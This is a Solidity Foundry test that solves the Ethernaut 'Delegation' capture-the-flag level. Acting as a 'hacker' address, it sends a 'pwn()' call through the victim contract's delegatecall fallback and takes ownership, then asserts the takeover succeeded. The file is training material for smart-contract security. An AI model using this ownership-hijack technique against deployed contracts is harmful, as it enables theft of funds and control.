// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/06-Delegation/DelegationFactory.sol";

contract DelegationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);
  

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        emit log_named_address("hacker address", hacker);
        emit log_named_address("the owner of the victim contract before exploit", ethernautDelegation.owner());
        payable(address(ethernautDelegation)).call(abi.encodeWithSignature('pwn()'));
        emit log_named_address("the owner of the victim contract before exploit", ethernautDelegation.owner());
        
        assertEq(ethernautDelegation.owner(), hacker);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}